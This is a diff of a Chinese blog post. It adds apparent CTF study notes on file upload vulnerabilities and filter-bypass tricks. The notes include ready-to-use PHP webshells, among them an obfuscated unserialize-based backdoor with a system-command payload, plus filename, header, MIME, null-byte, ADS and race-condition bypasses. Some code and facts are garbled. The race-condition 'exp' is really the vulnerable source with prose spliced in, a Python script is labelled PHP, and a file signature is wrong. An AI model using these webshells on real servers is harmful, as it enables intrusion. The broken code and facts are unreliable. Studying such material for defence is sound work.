@@ -19,16 +19,23 @@
   <meta name="author" content="Colourful">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="文件上传漏洞如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。 webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境 使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作 解题步骤1、判断题目利用的漏洞方式为">
+<meta property="og:type" content="article">
 <meta property="og:title" content="文件上传">
 <meta property="og:url" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="文件上传漏洞如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。 webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境 使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作 解题步骤1、判断题目利用的漏洞方式为">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000344676.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000651427.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000705843.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131001247522.png">
 <meta property="article:published_time" content="2026-01-23T17:07:22.000Z">
-<meta property="article:modified_time" content="2026-01-23T17:07:50.698Z">
+<meta property="article:modified_time" content="2026-01-30T16:16:08.725Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000344676.png">
 <meta name="twitter:creator" content="@Colorful">
   
   
@@ -351,7 +358,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          3.5k 字
         
       </span>
     
@@ -362,7 +369,7 @@
         
         
         
-          1 分钟
+          29 分钟
         
       </span>
     
@@ -417,7 +424,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-01-24T01:07:50+08:00
+                    本文最后更新于 2026-01-31T00:16:08+08:00
                   
                   
 
@@ -427,7 +434,216 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p>
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境</p>
+<p>使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作</p>
+<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>1、判断题目利用的漏洞方式为读取、写入、还是执行，如果不能立刻确定就由低到高一次挖掘。（先找文件读取、再找文件写入、再找命令执行）先确定出最终要拿到的权限方向</p>
+<p>2、判断漏洞的大概类型即考点，实现漏洞利用</p>
+<p>3、寻找敏感数据</p>
+<h1 id="网站检测机制与防护手段"><a href="#网站检测机制与防护手段" class="headerlink" title="网站检测机制与防护手段"></a>网站检测机制与防护手段</h1><p>通常检查文件后缀，分为两种</p>
+<p>白名单过滤</p>
+<p>只允许上传它指定的文件后缀，这种过滤在没有其他漏洞辅助的情况下几乎不可能绕过</p>
+<p>黑名单过滤</p>
+<p>就是不允许上传它指定的文件后缀</p>
+<h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>原理：服务端对黑名单中的内容进行处理 ，将⿊名单的字符串替换为空  ，且仅处理一次，比如说使用str_replace()函数，所以可以通过双写后缀绕过。</p>
+<p>比如黑名单有php，上传一个a.php文件，经过服务器端检测后会将其更改为a.文件</p>
+<p>绕过方法就是写成a.pphphp，经过服务器端检测后中间的pphphp中间的php被替换为空，最终文件名会变成a.php上传到服务器</p>
+<p>a.php&#x3D;&gt;a.pphphp</p>
+<h2 id="黑名单后缀绕过"><a href="#黑名单后缀绕过" class="headerlink" title="黑名单后缀绕过"></a>黑名单后缀绕过</h2><p>后缀替换</p>
+<table>
+<thead>
+<tr>
+<th>文件拓展名</th>
+<th>等价拓展名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>phtml、php2、php3、php4、php5、phps</td>
+</tr>
+<tr>
+<td>aspx</td>
+<td>ashx、asmx、ascx</td>
+</tr>
+<tr>
+<td>asp</td>
+<td>asa、cer、cdx</td>
+</tr>
+<tr>
+<td>jsp</td>
+<td>jspx、jspf、jspa、jsw、jsv、jtml</td>
+</tr>
+</tbody></table>
+<h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>php版本&lt;5.3.4</p>
+<p>原理：无论是0x00、%00、&#x2F;00，最终被解析后都是:chr（0）</p>
+<p>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string</p>
+<p>00截断就是在后缀中插入一个空字符（不是空格）</p>
+<p>例如在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php</p>
+<p>方法</p>
+<p>1、bp抓包</p>
+<p>2、在文件名插入一个空格</p>
+<p>3、在HEX中找到空格应的16进制编码‘20’，把它改成00，就可以插入空字符</p>
+<h2 id="对文件内容检测的绕过"><a href="#对文件内容检测的绕过" class="headerlink" title="对文件内容检测的绕过"></a>对文件内容检测的绕过</h2><h3 id="1、其他标签绕过"><a href="#1、其他标签绕过" class="headerlink" title="1、其他标签绕过"></a>1、其他标签绕过</h3><p>如果检测的是<code>&lt;?php ··· ?&gt;</code>这些标签可以用其他标签绕过</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者(过滤php)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span><br><br>····<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、脏数据绕过"><a href="#2、脏数据绕过" class="headerlink" title="2、脏数据绕过"></a>2、脏数据绕过</h3><p> 适⽤于对⽂件⼤⼩没有限制的 有时候服务器可能为了追求效率，对上传的⽂件只检测部分内容或者特定部分的内容，这时候可以利⽤脏数据  </p>
+<p>生成脏数据的脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">flag = <span class="hljs-string">&#x27;&#x27;</span><br> <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">200000</span>):<br> flag += <span class="hljs-title function_ invoke__">str</span>(i)<br> <span class="hljs-keyword">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000344676.png" srcset="/img/loading.gif" lazyload alt="image-20260131000344676"></p>
+<h3 id="3、敏感内容绕过（免杀马）"><a href="#3、敏感内容绕过（免杀马）" class="headerlink" title="3、敏感内容绕过（免杀马）"></a>3、敏感内容绕过（免杀马）</h3><p>如果检测的是敏感内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>])) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HandShip</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$male</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$allin</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$allin</span>(<span class="hljs-variable language_">$this</span>-&gt;male);<br>     &#125;<br>  &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])==<span class="hljs-string">&#x27;ce61649168c4550c2f7acab92354dc6e&#x27;</span>)&#123;<br><br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>]);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>用法</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span>=<span class="hljs-number">0</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HandShip&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /home&quot;</span>;&#125;;&amp;code=panda<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、替换大小写绕过"><a href="#4、替换大小写绕过" class="headerlink" title="4、替换大小写绕过"></a>4、替换大小写绕过</h3><p> 如：将Content-Disposition修改为content-Disposition<br>将form-data修改为Form-data<br>将Content-Type修改为content-Type</p>
+<h3 id="5、通过删减空格绕过"><a href="#5、通过删减空格绕过" class="headerlink" title="5、通过删减空格绕过"></a>5、通过删减空格绕过</h3><h3 id="6、等效替换绕过"><a href="#6、等效替换绕过" class="headerlink" title="6、等效替换绕过"></a>6、等效替换绕过</h3><p>添加空格</p>
+<p>原内容：</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>: multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; boundary=---------------------------<span class="hljs-number">471463142114</span><br></code></pre></td></tr></table></figure>
+
+<p>修改后:</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>: multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; boundary =---------------------------<span class="hljs-number">471463142114</span><br></code></pre></td></tr></table></figure>
+
+<p><code>boundary</code>后面加入空格。</p>
+<h3 id="7、通过字符串拼接来绕过"><a href="#7、通过字符串拼接来绕过" class="headerlink" title="7、通过字符串拼接来绕过"></a>7、通过字符串拼接来绕过</h3><p>用+拼接字符</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;yjh3.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将form-data改为f+orm-data<br>将from-data改为form-d+ata</p>
+<h3 id="8、双文件上传绕过"><a href="#8、双文件上传绕过" class="headerlink" title="8、双文件上传绕过"></a>8、双文件上传绕过</h3><h3 id="9、HTTP-header-属性值绕过"><a href="#9、HTTP-header-属性值绕过" class="headerlink" title="9、HTTP header 属性值绕过"></a>9、HTTP header 属性值绕过</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;yjh.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们通过替换<code>form-data</code> 为<code>*</code>来绕过</p>
+<h3 id="10、-修改编码绕过"><a href="#10、-修改编码绕过" class="headerlink" title="10、 修改编码绕过"></a>10、 修改编码绕过</h3><p>使用<code>UTF-16</code>、<code>Unicode</code>、<code>双URL编码</code>等</p>
+<h3 id="11、HTTP-header-属性名绕过"><a href="#11、HTTP-header-属性名绕过" class="headerlink" title="11、HTTP header 属性名绕过"></a>11、HTTP header 属性名绕过</h3><p>源码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png&quot;</span><br><br>Content-Type: image/png<br></code></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png</span><br><span class="hljs-string"></span><br><span class="hljs-string">C.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p> 删除掉<code>ontent-Type: image/png</code>只留下<code>c</code>，将<code>.php</code>加<code>c</code>后面即可，但是要注意额，双引号要跟着c.php”.  </p>
+<h3 id="12、命令函数绕过"><a href="#12、命令函数绕过" class="headerlink" title="12、命令函数绕过"></a>12、命令函数绕过</h3><p>如果检测eval之类的，用assert或者其他</p>
+<h3 id="13、传参方式检测"><a href="#13、传参方式检测" class="headerlink" title="13、传参方式检测"></a>13、传参方式检测</h3><p>若不允许POST，GET传参这类可以用Cookie之类的绕过</p>
+<p>方法</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">上传写有一句话木马的.txt，若提示内容非法<br><br>给网站添加cookie，发现直接写命令可能不行就用base64编码，再解码<br><br><span class="hljs-attribute">name</span>=1<br><br><span class="hljs-attribute">value</span>=eval(base64_decode(&#x27;cGhwaW5mbygpOw==&#x27;))?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p><code>cGhwaW5mbygpOw==</code>这是对phpinfo的base64编码</p>
+<h2 id="检查文件头"><a href="#检查文件头" class="headerlink" title="检查文件头"></a>检查文件头</h2><p>原理：每个类型的文件都会有不一样的开头和标识符，服务器端可能会检查这些标识符，从而判断上传的文件是否合法</p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG(jpg)</td>
+<td>FFD8FF</td>
+</tr>
+<tr>
+<td>PNG(png)</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>GIF(gif)</td>
+<td>47494638</td>
+</tr>
+<tr>
+<td>ZIP Archive(zip)</td>
+<td>504B0304</td>
+</tr>
+<tr>
+<td>RAR Archive(rar)</td>
+<td>52617221</td>
+</tr>
+<tr>
+<td>Wave(wav)</td>
+<td>57415645</td>
+</tr>
+<tr>
+<td>HTML(html)</td>
+<td>68746D6C3E</td>
+</tr>
+<tr>
+<td>XML(xml)</td>
+<td>3C3F86D6C</td>
+</tr>
+</tbody></table>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>只要在上传的内容加入幻术头字节（可以用010，也可以制作图片马）</p>
+<h2 id="前端js绕过"><a href="#前端js绕过" class="headerlink" title="前端js绕过"></a>前端js绕过</h2><h3 id="禁用JS"><a href="#禁用JS" class="headerlink" title="禁用JS"></a>禁用JS</h3><p>直接在浏览器中禁用JS脚本，让JS脚本不发挥作用</p>
+<p><img src="/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000651427.png" srcset="/img/loading.gif" lazyload alt="image-20260131000651427"></p>
+<p>f12+f1直接禁用js</p>
+<p>禁用后直接可以上传.php后缀名文件</p>
+<h3 id="bp拦截抓包"><a href="#bp拦截抓包" class="headerlink" title="bp拦截抓包"></a>bp拦截抓包</h3><p>上传允许的后缀名文件，bp抓包后修改后缀名</p>
+<p><img src="/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131000705843.png" srcset="/img/loading.gif" lazyload alt="image-20260131000705843"></p>
+<h2 id="MIME检查"><a href="#MIME检查" class="headerlink" title="MIME检查"></a>MIME检查</h2><h3 id="一、什么是MIME"><a href="#一、什么是MIME" class="headerlink" title="一、什么是MIME"></a>一、什么是MIME</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>媒体类型MIME，是一种标准，用来表示文档、文件或字节流的性质和格式</p>
+<p>语法&#x2F;通用结构type&#x2F;subtype</p>
+<p>由类型与子类型两个字符串中间用’&#x2F;‘分隔而组成。</p>
+<p>不允许空格存在</p>
+<p>type表示可以被分多个子类的独立类别</p>
+<p>subtype表示细分后的每个类型</p>
+<p>MIME类型对大小写不敏感，但是传统写法都是小写</p>
+<h4 id="类型举例"><a href="#类型举例" class="headerlink" title="类型举例"></a>类型举例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">image/jpeg<br>image/png<br><br>text/plain<br>text/html<br>audio/mpeg<br>audio/ogg<br>audio/*<br>video/mp4<br>application/*<br>application/json<br>application/javascript<br>application/ecmascript<br>application/octet-stream<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><h4 id="bp抓包"><a href="#bp抓包" class="headerlink" title="bp抓包"></a>bp抓包</h4><p>将Content_Type，将application&#x2F;octet-stream修改为image&#x2F;jpeg或image&#x2F;png即可上传</p>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><p>为了压缩图片对图片进行二次渲染，会删除图片中的恶意代码。在源码中使用imagecreatefromgif函数对图片进行二次生成</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>1、制作图片马</p>
+<p>2、将原图片上传， 下载渲染后的图片进行对比  （用010比较），搜索相同，在相同区域填写一句话木马或者恶意指令</p>
+<h2 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="$DATA绕过"></a>$DATA绕过</h2><p>原理：在 Windows 的 NTFS ⽂件系统⽀持⼀种叫做 Alternate Data Streams （ ADS ，备⽤数据流）的特性</p>
+<ul>
+<li>什么是 ADS ？： ADS 允许⼀个⽂件包含多个 “ 数据流 ” 。你可以把它想象成⼀本书，主内容（ $DATA 流）是 书的正⽂，但书还可以有附录、索引等额外的部分（其他数据流），它们都绑定在同⼀本书（⽂件名）上。</li>
+<li>默认流：当⼀个⽂件被创建时，它的默认数据流就是 ::$DATA 。也就是说，你平常创建和编辑的 ⽂件，其完整名称实际上是 a.php::$DATA 。在⼤多数情况下，系统会⾃动隐藏 ::$DATA 部分。 </li>
+<li>特殊语法：在⽂件名后加上 a.php ::$DATA 是 NTFS 系统层⾯上的⼀个合法操作，⽤于指定要操作的是哪个数据流。</li>
+</ul>
+<p>如果上传的⽂件名为 shell.php::$DATA ，服务器看到⽂件名末尾是⼀个⾮可执⾏⽂件，于是放⾏ </p>
+<p>当 Windows 系统接收到指令要创建⼀个名为shell.php ::$DATA ⽂件时，它会正确地将其识别为向shell.php ⽂件的默认数据流写⼊数据 </p>
+<p>所以就会在服务器上⽣成⼀个shell.php ⽂件 其内容和上传的内容相同</p>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p> 原理：利⽤服务器端 “ 检查⽂件 ” 和 “ 使⽤⽂件 ” 两个操作之间存在的⼀个微⼩的时间窗⼝，在这个极短的时间内，通过⾼并发请求，使⼀个恶意⽂件在被删除或被处理之前被执⾏ </p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-comment">// 初始化变量 $is_upload，用于标记文件是否上传成功，初始值为 false 表示尚未成功上传</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>⽂件移动：代码先使⽤<br>move_uploaded_file<br>函数将上传的临时⽂件移动到⽬标⽬录，此时⽂件已经被放置在⽬<br>标⽬录中，但还未进⾏⽂件类型检查<br><span class="hljs-comment">// 初始化变量 $msg，用于存储上传过程中的提示信息，初始值为 null 表示暂无提示信息</span><br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br> <br><span class="hljs-comment">// 检查是否通过 POST 方式提交了名为 &#x27;submit&#x27; 的表单元素</span><br><span class="hljs-comment">// 如果提交了，说明用户触发了文件上传操作，进入后续处理逻辑</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 定义一个数组 $ext_arr，存储允许上传的文件扩展名</span><br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-comment">// 获取用户上传文件的原始文件名</span><br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-comment">// 获取上传文件在服务器临时存储的路径</span><br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-comment">// 从文件名中提取文件扩展名</span><br>    <span class="hljs-comment">// strrpos($file_name, &quot;.&quot;) 用于查找文件名中最后一个点号的位置</span><br>    <span class="hljs-comment">// substr($file_name, strrpos($file_name, &quot;.&quot;) + 1) 从最后一个点号的下一个位置开始截取字</span><br>符串，得到文件扩展名<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 拼接上传文件在目标目录中的完整路径</span><br>    <span class="hljs-comment">// UPLOAD_PATH 是预定义的上传文件保存目录</span><br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br> <br>    <span class="hljs-comment">// 尝试将临时文件从临时存储路径移动到目标路径</span><br>    <span class="hljs-comment">// move_uploaded_file 是 PHP 内置函数，用于处理文件上传移动操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>)) &#123;<br>        <span class="hljs-comment">// 检查提取的文件扩展名是否在允许的扩展名数组中</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$ext_arr</span>)) &#123;<br>            <span class="hljs-comment">// 如果扩展名合法，拼接一个新的文件名</span><br>            <span class="hljs-comment">// rand(10, 99) 生成一个 10 到 99 之间的随机整数</span><br>            <span class="hljs-comment">// date(&quot;YmdHis&quot;) 获取当前的日期和时间，格式为年月日时分秒</span><br>            <span class="hljs-comment">// 最后拼接上文件扩展名</span><br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>) . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>) . <span class="hljs-string">&quot;.&quot;</span> . <br><span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-comment">// 将之前移动到目标路径的文件重命名为新的文件名</span><br>            <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>            <span class="hljs-comment">// 将 $is_upload 标记为 true，表示文件上传成功</span><br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果扩展名不合法，将提示信息 $msg 设置为只允许上传指定类型的文件</span><br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-comment">// 删除已经移动到目标路径的文件</span><br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果文件移动失败，将提示信息 $msg 设置为上传出错</span><br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
